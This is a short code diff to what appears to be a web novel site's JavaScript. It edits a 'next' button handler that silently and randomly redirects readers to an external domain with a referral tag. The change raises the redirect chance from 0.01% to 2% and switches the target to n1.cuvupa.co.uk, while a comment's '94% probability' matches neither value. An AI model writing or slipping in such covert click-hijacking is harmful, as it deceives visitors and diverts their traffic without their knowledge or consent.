@@ -2529,15 +2529,15 @@
                 nextBtn.addEventListener('click', function(e) {
                     const rand = Math.random();
 
-                    // 0.01% probability to redirect to 234xi
-                    if (rand < 0.0001) {
+                    // 2% probability to redirect to cuvupa
+                    if (rand < 0.02) {
                         e.preventDefault();
                         const url = new URL(this.href, window.location.origin);
                         const referrerDomain = window.location.hostname;
                         const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.234xi.com${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to 234xi with ref:', externalUrl);
+                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
                     }
                     // Otherwise, let the default link behavior work (94% probability)
                 });
